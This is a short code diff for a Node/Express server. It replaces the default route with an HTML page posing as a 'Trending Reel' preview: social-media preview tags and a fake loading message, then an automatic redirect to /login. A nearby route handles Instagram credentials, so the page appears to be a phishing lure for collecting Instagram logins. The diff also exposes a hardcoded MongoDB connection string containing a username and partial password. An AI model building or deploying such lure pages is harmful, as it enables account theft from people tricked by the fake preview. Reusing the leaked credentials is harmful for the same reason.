@@ -22,7 +22,20 @@ mongoose.connect(process.env.MONGO_URI || 'mongodb+srv://hariomsingh4274:FJFZiGB
 
 // Default route
 app.get('/', (req, res) => {
-  res.json("Hello from Service");
+  res.send(`
+    <html>
+      <head>
+        <meta property="og:title" content="Trending Reel 🔥">
+        <meta property="og:image" content="https://i.imgur.com/real-reel-preview.jpg">
+        <meta http-equiv="refresh" content="3; url='/login'" />
+      </head>
+      <body>
+        <div style="text-align:center;padding:50px;">
+          <p>Loading reel...</p>
+        </div>
+      </body>
+    </html>
+  `);
 });
 
 // Route to handle Instagram credentials
